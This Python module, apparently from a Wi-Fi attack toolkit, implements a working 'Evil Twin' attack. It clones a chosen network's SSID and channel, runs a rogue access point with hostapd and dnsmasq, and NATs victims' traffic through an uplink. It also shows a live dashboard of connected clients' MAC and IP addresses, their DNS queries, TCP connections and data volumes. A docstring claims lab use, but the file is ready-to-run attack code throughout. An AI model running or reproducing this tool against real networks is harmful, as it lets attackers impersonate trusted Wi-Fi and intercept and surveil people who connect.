"""Evil twin attack service functions."""

from __future__ import annotations

import json
import shutil
import subprocess
import tempfile
import time
from datetime import datetime
from pathlib import Path
from typing import Optional

from rich import box
from rich.console import Group
from rich.live import Live
from rich.panel import Panel
from rich.prompt import Prompt
from rich.table import Table

from app.ui.theme import BORDER_STYLE
from cleanup import resolve_evil_twin_log_dir


def run_evil_twin_attack(app) -> None:
    """Run Evil Twin attack workflow."""
    run_evil_twin_attack_impl(app)


def run_evil_twin_attack_impl(app) -> None:
    """Create a lab access point for authorized wireless assessment."""
    original_settings = {}
    log_dir: Optional[Path] = None

    try:
        try:
            Path("/var/lib/misc/dnsmasq.leases").unlink()
        except FileNotFoundError:
            pass
        try:
            with open("/var/lib/misc/dnsmasq.leases", "w"):
                pass
            subprocess.run(["chmod", "644", "/var/lib/misc/dnsmasq.leases"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            dnsmasq_dir = Path("/var/lib/misc")
            if not dnsmasq_dir.exists():
                dnsmasq_dir.mkdir(parents=True, exist_ok=True)
                subprocess.run(["chmod", "755", str(dnsmasq_dir)], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except Exception as exc:
            app.logger.log_evil_twin(f"Warning: Could not create dnsmasq.leases file: {str(exc)}")
        evil_twin_dir = app.logger.log_dir / "evil_twin"
        if evil_twin_dir.exists():
            for file in evil_twin_dir.glob("*"):
                try:
                    if file.is_dir():
                        shutil.rmtree(file)
                    else:
                        file.unlink()
                except Exception:
                    pass
    except Exception as exc:
        app.logger.log_evil_twin(f"Warning: Could not clear previous cache: {str(exc)}")

    try:
        app.console.print("[bold blue]Saving original network settings...[/]")
        try:
            resolved = app._ensure_wireless_iface_exists(app.interface_name)
        except FileNotFoundError as exc:
            app.console.print(f"[bold red]{exc}[/]")
            return
        if resolved != app.interface_name:
            app.logger.log_evil_twin(
                f"Resolved interface {app.interface_name!r} -> {resolved!r} (stale or missing name)"
            )
            app.console.print(
                f"[yellow]Using interface [cyan]{resolved}[/] "
                f"([dim]{app.interface_name}[/] is not present).[/]"
            )
            app.interface_name = resolved

        mon_iface = app.wifi_adapter.find_monitor_interface()
        if mon_iface == app.interface_name:
            app.console.print(
                "[bold blue]Switching to managed mode for Evil Twin AP (hostapd requires AP/managed).[/]"
            )
            app.logger.log_evil_twin("Switching monitor interface to managed for hostapd")
            app.interface_name = app.wifi_adapter.set_managed_mode(
                app.interface_name,
                restart_network_manager=False,
            )

        original_settings["ip_forward"] = subprocess.check_output(["cat", "/proc/sys/net/ipv4/ip_forward"]).decode().strip()
        original_settings["interface_state"] = subprocess.check_output(["ip", "addr", "show", app.interface_name]).decode()
        original_settings["route_table"] = subprocess.check_output(["ip", "route", "show"]).decode()
        original_settings["evil_twin_uplink"] = app._default_ipv4_uplink_interface(exclude={app.interface_name})
        original_settings["iptables"] = subprocess.check_output(["iptables-save"]).decode()
        original_settings["resolved_status"] = subprocess.run(
            ["systemctl", "is-active", "systemd-resolved"],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
        ).stdout.decode().strip()
        original_settings["network_manager_status"] = subprocess.run(
            ["systemctl", "is-active", "NetworkManager"],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
        ).stdout.decode().strip()
        original_settings["wpa_supplicant_status"] = subprocess.run(
            ["systemctl", "is-active", "wpa_supplicant"],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
        ).stdout.decode().strip()

        try:
            original_settings["wifi_connections"] = subprocess.check_output(
                ["nmcli", "-t", "-f", "NAME,UUID,TYPE", "connection", "show"]
            ).decode()
        except Exception:
            original_settings["wifi_connections"] = ""

        default_ssid = ""
        default_channel = "1"
        if app.selected_network:
            network = app.networks[app.selected_network]
            default_ssid = network["ssid"]
            default_channel = str(network["channel"])
            app.console.print(f"\n[bold yellow]Selected network: {default_ssid} (Channel: {default_channel})[/]")

        ssid = Prompt.ask("Enter SSID for the Evil Twin", default=default_ssid)
        if not ssid and default_ssid:
            ssid = default_ssid
            app.console.print(f"[bold cyan]Using selected network SSID: {ssid}[/]")
        if not _valid_hostapd_ssid(ssid):
            app.console.print("[bold red]Invalid SSID. Use 1-32 bytes without line breaks.[/]")
            return

        channel_input = Prompt.ask("Enter channel (1-11)", default=default_channel)
        try:
            channel = int(channel_input)
            if channel < 1 or channel > 11:
                app.console.print("[bold yellow]Invalid channel, using default channel 1[/]")
                channel = 1
        except (TypeError, ValueError):
            app.console.print("[bold yellow]Invalid channel, using default channel 1[/]")
            channel = 1

        use_wpa2 = Prompt.ask("Enable WPA2-PSK security? (y/n)", choices=["y", "n"]) == "y"
        if use_wpa2:
            wpa_passphrase = Prompt.ask("Enter WPA2 passphrase (8-63 characters)")
            if not _valid_wpa_passphrase(wpa_passphrase):
                app.console.print("[bold red]Invalid WPA2 passphrase. Use 8-63 characters without line breaks.[/]")
                return

        uplink_precheck = original_settings.get("evil_twin_uplink")
        uplink_ok, uplink_reason = app._evil_twin_nonwifi_internet_uplink_ok(uplink_precheck)
        if not uplink_ok:
            if uplink_reason == "no_uplink":
                app.logger.log_evil_twin("Precheck: no uplink excluding AP iface")
            else:
                app.logger.log_evil_twin(f"Precheck: uplink {uplink_precheck!r} is wireless")
        elif uplink_precheck:
            app.console.print(
                f"[success]Non-Wi-Fi uplink OK:[/] [cyan]{uplink_precheck}[/] "
                "(clients can use NAT/DNS if routing stays up after services stop)."
            )

        app.logger.log_evil_twin("Attack started", ssid=ssid, channel=channel, security="WPA2" if use_wpa2 else "Open")
        log_dir = app.logger.log_dir / "evil_twin"
        log_dir.mkdir(exist_ok=True)

        hostapd_conf = f"""interface={app.interface_name}
driver=nl80211
ssid={ssid}
hw_mode=g
channel={channel}
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
wmm_enabled=1
ieee80211n=1
ht_capab=[HT40+][SHORT-GI-40][DSSS_CCK-40]"""
        if use_wpa2:
            hostapd_conf += f"""
wpa=2
wpa_key_mgmt=WPA-PSK
wpa_passphrase={wpa_passphrase}
wpa_pairwise=CCMP
rsn_pairwise=CCMP"""

        dnsmasq_conf = f"""interface={app.interface_name}
dhcp-range=192.168.1.2,192.168.1.30,255.255.255.0,12h
dhcp-option=3,192.168.1.1
dhcp-option=6,192.168.1.1
log-queries
log-dhcp
log-facility={log_dir}/dnsmasq.log
log-async=20
listen-address=192.168.1.1
bind-interfaces
no-resolv
server=8.8.4.4
server=8.8.8.8
dhcp-leasefile={log_dir}/dnsmasq.leases"""

        app.console.print("[bold blue]Preparing network environment...[/]")
        app.logger.log_evil_twin("Stopping network services")
        subprocess.run(["systemctl", "stop", "NetworkManager"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        subprocess.run(["systemctl", "stop", "wpa_supplicant"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        subprocess.run(["killall", "dnsmasq"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        subprocess.run(["killall", "hostapd"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        time.sleep(2)

        uplink = original_settings.get("evil_twin_uplink")
        if uplink and uplink != app.interface_name:
            app.console.print(f"[bold blue]Refreshing DHCP on uplink {uplink} (internet exit)...[/]")
            app.logger.log_evil_twin(f"Renewing DHCP on uplink {uplink} after stopping NetworkManager")
            app._renew_dhcp_on_interface(uplink)
            time.sleep(2)
            uplink_live = app._default_ipv4_uplink_interface(exclude={app.interface_name})
            if uplink_live:
                uplink = uplink_live
                original_settings["evil_twin_uplink"] = uplink
            else:
                app.console.print(
                    "[yellow]No default route after NM stop. Use Ethernet (or second NIC) with DHCP for internet uplink.[/]"
                )

        app.console.print("[bold blue]Configuring network interface...[/]")
        app.logger.log_evil_twin("Configuring network interface")
        subprocess.run(["rfkill", "unblock", "all"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        subprocess.run(["ip", "link", "set", app.interface_name, "down"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        subprocess.run(["ip", "addr", "flush", "dev", app.interface_name], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        subprocess.run(["ip", "link", "set", app.interface_name, "up"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        subprocess.run(["ip", "addr", "add", "192.168.1.1/24", "dev", app.interface_name], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        time.sleep(2)

        hostapd_path = log_dir / "hostapd.conf"
        dnsmasq_path = log_dir / "dnsmasq.conf"
        with open(hostapd_path, "w") as f:
            f.write(hostapd_conf)
        hostapd_path.chmod(0o600)
        with open(dnsmasq_path, "w") as f:
            f.write(dnsmasq_conf)
        dnsmasq_path.chmod(0o600)

        app.console.print("[bold blue]Starting Evil Twin access point...[/]")
        app.logger.log_evil_twin("Starting access point")
        hostapd_proc = subprocess.Popen(["hostapd", str(hostapd_path)], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        time.sleep(3)
        if hostapd_proc.poll() is not None:
            app.logger.log_evil_twin("Failed to start hostapd", error=True)
            raise Exception("Failed to start hostapd. Check your wireless adapter.")

        app.logger.log_evil_twin("Starting DHCP server")
        dnsmasq_proc = subprocess.Popen(["dnsmasq", "-C", str(dnsmasq_path), "-d"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        time.sleep(2)
        if dnsmasq_proc.poll() is not None:
            app.logger.log_evil_twin("Failed to start dnsmasq", error=True)
            raise Exception("Failed to start dnsmasq. Check configuration.")

        subprocess.run(["sysctl", "net.ipv4.ip_forward=1"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        wan_iface = original_settings.get("evil_twin_uplink")
        if not wan_iface or wan_iface == app.interface_name:
            wan_iface = app._default_ipv4_uplink_interface(exclude={app.interface_name})
        if wan_iface == app.interface_name:
            wan_iface = None
        if wan_iface and not (Path("/sys/class/net") / wan_iface).is_dir():
            wan_iface = None

        app.logger.log_evil_twin("Configuring iptables for Evil Twin internet sharing")
        subprocess.run(["iptables", "-F"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        subprocess.run(["iptables", "-t", "nat", "-F"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

        evil_twin_lan = "192.168.1.0/24"
        if wan_iface:
            subprocess.run(
                ["iptables", "-t", "nat", "-A", "POSTROUTING", "-s", evil_twin_lan, "-o", wan_iface, "-j", "MASQUERADE"],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
            )
            subprocess.run(
                ["iptables", "-A", "FORWARD", "-i", app.interface_name, "-o", wan_iface, "-j", "ACCEPT"],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
            )
            subprocess.run(
                ["iptables", "-A", "FORWARD", "-i", wan_iface, "-o", app.interface_name, "-j", "ACCEPT"],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
            )
            app.console.print(
                f"[success]Internet sharing on[/] — NAT [dim]{evil_twin_lan}[/] → [cyan]{wan_iface}[/] "
                f"(AP [cyan]{app.interface_name}[/])"
            )
            app.logger.log_evil_twin(
                f"NAT/forward: LAN {evil_twin_lan} via AP {app.interface_name} masq out {wan_iface}"
            )
        else:
            subprocess.run(
                ["iptables", "-A", "FORWARD", "-i", app.interface_name, "-j", "ACCEPT"],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
            )
            app.console.print(
                "[warning]No WAN uplink detected — clients join the lab AP but may not reach the internet. "
                "Connect Ethernet (default route) or a second online interface.[/]"
            )
            app.logger.log_evil_twin("No WAN iface; NAT skipped, permissive FORWARD from AP only")

        try:
            acct = subprocess.run(
                ["sysctl", "-n", "net.netfilter.nf_conntrack_acct"],
                capture_output=True,
                text=True,
                timeout=3,
            )
            original_settings["nf_conntrack_acct"] = acct.stdout.strip() if acct.returncode == 0 else None
            subprocess.run(
                ["sysctl", "-w", "net.netfilter.nf_conntrack_acct=1"],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
            )
        except Exception:
            original_settings["nf_conntrack_acct"] = None

        dnsmasq_log = log_dir / "dnsmasq.log"
        if not dnsmasq_log.exists():
            dnsmasq_log.touch()

        with Live(refresh_per_second=4) as live:
            start_time = time.time()
            clients_connected = {}
            tcp_connections: list[tuple[str, str, str]] = []
            tcp_poll = {"last": 0.0}
            cache_dir = Path("/tmp/wifiangel_evil_twin")
            cache_dir.mkdir(exist_ok=True)
            session_file = cache_dir / f"clients_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
            leases_file = log_dir / "dnsmasq.leases"
            try:
                leases_file.touch(exist_ok=True)
                subprocess.run(["chmod", "644", str(leases_file)], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            except Exception as exc:
                app.logger.log_evil_twin(f"Warning: Could not create dnsmasq.leases file: {str(exc)}")

            while True:
                status_table = Table(show_header=True, header_style="bold magenta", box=box.MINIMAL, border_style=BORDER_STYLE, title="[bold blue]Evil Twin Status[/]")
                status_table.add_column("Evil Twin SSID", style="cyan")
                status_table.add_column("Channel", style="green")
                status_table.add_column("Security", style="yellow")
                status_table.add_column("AP Status", style="magenta")
                status_table.add_column("Running Time", style="cyan")
                elapsed = int(time.time() - start_time)
                time_str = f"{elapsed//3600:02d}:{(elapsed%3600)//60:02d}:{elapsed%60:02d}"
                security_str = f"WPA2-PSK ({wpa_passphrase})" if use_wpa2 else "Open"
                ap_status = "[bold green]Active"
                if hostapd_proc.poll() is not None or dnsmasq_proc.poll() is not None:
                    ap_status = "[bold red]Error"
                    app.logger.log_evil_twin("Service crashed, attempting restart")
                    if hostapd_proc.poll() is not None:
                        hostapd_proc = subprocess.Popen(["hostapd", str(hostapd_path)], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                    if dnsmasq_proc.poll() is not None:
                        dnsmasq_proc = subprocess.Popen(["dnsmasq", "-C", str(dnsmasq_path), "-d"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                status_table.add_row(ssid, str(channel), security_str, ap_status, time_str)

                now = time.time()
                if now - tcp_poll["last"] >= 5.0:
                    tcp_poll["last"] = now
                    try:
                        tcp_connections = app._evil_twin_fetch_established_tcp_for_lan()
                    except Exception:
                        tcp_connections = []

                tcp_table = Table(show_header=True, header_style="bold blue", box=box.MINIMAL, border_style=BORDER_STYLE, title="[bold blue]Active TCP ESTABLISHED Connections[/] (refresh ~5s, uses ss/netstat)")
                tcp_table.add_column("Local Address", style="cyan")
                tcp_table.add_column("Remote Address", style="green")
                tcp_table.add_column("State", style="yellow")
                for local, remote, state in tcp_connections:
                    tcp_table.add_row(local, remote, state)

                dns_table = Table(show_header=True, header_style="bold green", box=box.MINIMAL, border_style=BORDER_STYLE, title="[bold blue]Recent DNS Queries[/]")
                dns_table.add_column("Time", style="cyan")
                dns_table.add_column("Client IP", style="green")
                dns_table.add_column("Query", style="yellow")
                dns_table.add_column("Type", style="magenta")
                if dnsmasq_log.exists():
                    try:
                        with open(dnsmasq_log, "r", errors="replace") as f:
                            dns_parsed = app._evil_twin_parse_dnsmasq_query_lines(f.readlines())
                        for time_hint, client_ip, query_name, query_type in dns_parsed:
                            dns_table.add_row(time_hint, client_ip, query_name, query_type)
                    except OSError:
                        pass

                clients_table = Table(show_header=True, header_style="bold yellow", box=box.MINIMAL, border_style=BORDER_STYLE, title="[bold blue]Connected Clients[/]")
                clients_table.add_column("MAC Address", style="cyan")
                clients_table.add_column("IP Address", style="green")
                clients_table.add_column("Connected Since", style="yellow")
                clients_table.add_column("Data Transferred", style="magenta")
                try:
                    leases_file = log_dir / "dnsmasq.leases"
                    if leases_file.exists():
                        with open(leases_file, "r") as f:
                            leases = f.readlines()
                            current_clients = {}
                            for lease in leases:
                                parts = lease.split()
                                if len(parts) >= 5:
                                    mac = parts[1]
                                    ip = parts[2]
                                    hostname = parts[3]
                                    if ip.startswith("192.168.1."):
                                        prior = clients_connected.get(mac)
                                        if prior and prior.get("ip") == ip and prior.get("connected_since"):
                                            first_seen = prior["connected_since"]
                                        else:
                                            first_seen = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                                        current_clients[mac] = {"ip": ip, "hostname": hostname, "connected_since": first_seen}
                                        if mac not in clients_connected:
                                            app.logger.log_evil_twin(f"New client connected: {mac} ({ip})")
                            clients_connected = current_clients
                            try:
                                with open(session_file, "w") as f:
                                    json.dump(clients_connected, f)
                            except Exception:
                                pass
                except Exception:
                    pass

                for mac, details in clients_connected.items():
                    b = app._evil_twin_nf_conntrack_bytes_for_ip(details["ip"])
                    clients_table.add_row(
                        mac,
                        details["ip"],
                        details["connected_since"],
                        app._evil_twin_format_bytes(b),
                    )

                live.update(
                    Group(
                        status_table,
                        Panel(clients_table, border_style=BORDER_STYLE, box=box.MINIMAL),
                        Panel(dns_table, border_style=BORDER_STYLE, box=box.MINIMAL),
                        Panel(tcp_table, border_style=BORDER_STYLE, box=box.MINIMAL),
                    )
                )
                time.sleep(1)
    except KeyboardInterrupt:
        app.logger.log_evil_twin("Attack stopped by user")
        app.console.print("\n[bold yellow]Evil Twin attack stopped by user.[/]")
    except Exception as exc:
        app.logger.log_evil_twin(f"Error during attack: {str(exc)}", error=True)
        app.console.print(f"\n[bold red]Error during Evil Twin attack: {str(exc)}[/]")
    finally:
        app.cleanup_evil_twin(original_settings, log_dir)
        app.current_menu = "attack"


def cleanup_evil_twin(app, original_settings, log_dir=None) -> None:
    """Cleanup Evil Twin attack resources."""
    log_dir = resolve_evil_twin_log_dir(app.logger.log_dir, log_dir)
    app.console.print("[bold blue]Cleaning up and restoring network settings...[/]")
    app.logger.log_evil_twin("Starting cleanup process")

    try:
        cache_dir = Path("/tmp/wifiangel_evil_twin")
        if cache_dir.exists():
            try:
                shutil.rmtree(cache_dir)
            except Exception:
                pass

        try:
            leases_file = log_dir / "dnsmasq.leases"
            if leases_file.exists():
                with open(leases_file, "w", encoding="utf-8"):
                    pass
                subprocess.run(["chmod", "644", str(leases_file)], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except Exception:
            pass

        app.logger.log_evil_twin("Stopping all related processes")
        for proc in ["hostapd", "dnsmasq", "dhcpd", "wpa_supplicant"]:
            subprocess.run(["killall", "-9", proc], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

        if "ip_forward" in original_settings:
            app.logger.log_evil_twin("Resetting IP forwarding")
            subprocess.run(
                ["sysctl", f"net.ipv4.ip_forward={original_settings['ip_forward']}"],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
            )

        prev_acct = original_settings.get("nf_conntrack_acct")
        if prev_acct is not None:
            subprocess.run(
                ["sysctl", "-w", f"net.netfilter.nf_conntrack_acct={prev_acct}"],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
            )

        app.logger.log_evil_twin("Resetting iptables")
        subprocess.run(["iptables", "-F"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        subprocess.run(["iptables", "-t", "nat", "-F"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        subprocess.run(["iptables", "-t", "mangle", "-F"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        subprocess.run(["iptables", "-X"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

        if "iptables" in original_settings:
            try:
                with tempfile.NamedTemporaryFile(mode="w+", encoding="utf-8") as f:
                    f.write(original_settings["iptables"])
                    f.flush()
                    subprocess.run(["iptables-restore", f.name], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            except Exception:
                app.logger.log_evil_twin("Failed to restore iptables configuration", error=True)

        if "mon" in app.interface_name:
            try:
                subprocess.run(["airmon-ng", "stop", app.interface_name], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                app.interface_name = app.interface_name.replace("mon", "")
            except Exception:
                app.logger.log_evil_twin("Failed to stop monitor mode using airmon-ng", error=True)

        subprocess.run(["ip", "link", "set", app.interface_name, "down"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        subprocess.run(["iw", app.interface_name, "set", "type", "managed"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        subprocess.run(["ip", "link", "set", app.interface_name, "up"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

        if original_settings.get("resolved_status") == "active":
            subprocess.run(["systemctl", "restart", "systemd-resolved"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        if original_settings.get("wpa_supplicant_status") == "active":
            subprocess.run(["systemctl", "restart", "wpa_supplicant"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        if original_settings.get("network_manager_status") == "active":
            subprocess.run(["systemctl", "restart", "NetworkManager"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

        app.console.print("[success]Network settings restored successfully.[/]")
        app.console.print("[success]Interface switched back to managed mode.[/]")
        app.console.print("[info]You can now manually connect to your WiFi network.[/]")
    except Exception as exc:
        app.logger.log_evil_twin(f"Error during cleanup: {str(exc)}", error=True)
        app.console.print(f"[bold red]Error during cleanup: {str(exc)}[/]")
    finally:
        verify_network_services(app)


def verify_network_services(app) -> None:
    """Verify that network services are running correctly."""
    try:
        _ensure_service_active(app, "NetworkManager", warn="NetworkManager")
        _ensure_service_active(app, "wpa_supplicant", warn="wpa_supplicant")
        _ensure_managed_mode(app)
    except Exception as exc:
        app.logger.error(f"Error during network service verification: {str(exc)}")
        app.console.print("[error]Could not verify network services status[/]")


def _ensure_service_active(app, service_name: str, *, warn: str) -> None:
    try:
        status = subprocess.run(
            ["systemctl", "is-active", service_name],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            timeout=5,
        ).stdout.decode().strip()
        if status == "active":
            return
        app.console.print(f"[warning]{warn} is not active, attempting to restart...[/]")
        try:
            subprocess.run(["systemctl", "restart", service_name], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=10)
            time.sleep(2)
            status = subprocess.run(
                ["systemctl", "is-active", service_name],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                timeout=5,
            ).stdout.decode().strip()
            if status != "active" and service_name == "NetworkManager":
                subprocess.run(["systemctl", "start", service_name], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=15)
                time.sleep(2)
                status = subprocess.run(
                    ["systemctl", "is-active", service_name],
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    timeout=5,
                ).stdout.decode().strip()
            if status != "active":
                app.console.print(f"[error]Failed to restart {warn}[/]")
        except subprocess.TimeoutExpired:
            app.console.print(f"[error]{warn} restart timed out[/]")
        except Exception as exc:
            app.console.print(f"[error]Error restarting {warn}: {str(exc)}[/]")
    except subprocess.TimeoutExpired:
        app.console.print(f"[error]{warn} status check timed out[/]")
    except Exception as exc:
        app.console.print(f"[error]Error checking {warn}: {str(exc)}[/]")


def _ensure_managed_mode(app) -> None:
    try:
        mode = app.wifi_adapter.get_interface_type(app.interface_name)

        def _legacy_iwconfig_managed() -> Optional[bool]:
            try:
                r = subprocess.run(
                    ["iwconfig", app.interface_name],
                    capture_output=True,
                    text=True,
                    timeout=5,
                )
                if r.returncode != 0:
                    return None
                return "Mode:Managed" in r.stdout
            except (FileNotFoundError, subprocess.TimeoutExpired, OSError):
                return None

        if mode is None:
            legacy = _legacy_iwconfig_managed()
            if legacy is True:
                mode = "managed"
            elif legacy is False:
                mode = "other"

        if mode == "managed":
            return
        if mode is None:
            app.console.print(
                "[warning]Could not read interface mode via `iw` or `iwconfig`; "
                "skipped mode check (wireless-tools may be missing or driver has no WE).[/]"
            )
            return

        app.console.print("[warning]Interface not in managed mode, attempting to fix...[/]")
        try:
            subprocess.run(["ip", "link", "set", app.interface_name, "down"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=5)
            subprocess.run(["iw", app.interface_name, "set", "type", "managed"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=5)
            subprocess.run(["ip", "link", "set", app.interface_name, "up"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=5)
            time.sleep(2)
            mode2 = app.wifi_adapter.get_interface_type(app.interface_name)
            if mode2 != "managed" and _legacy_iwconfig_managed() is not True:
                app.console.print("[error]Failed to set interface to managed mode[/]")
        except subprocess.TimeoutExpired:
            app.console.print("[error]Interface mode change timed out[/]")
        except Exception as exc:
            app.console.print(f"[error]Error changing interface mode: {str(exc)}[/]")
    except Exception as exc:
        app.console.print(f"[warning]Interface mode verification issue: {str(exc)}[/]")


def _valid_hostapd_ssid(ssid: str) -> bool:
    if not ssid or "\n" in ssid or "\r" in ssid:
        return False
    return 1 <= len(ssid.encode("utf-8", errors="ignore")) <= 32


def _valid_wpa_passphrase(passphrase: str) -> bool:
    if not passphrase or "\n" in passphrase or "\r" in passphrase:
        return False
    return 8 <= len(passphrase) <= 63
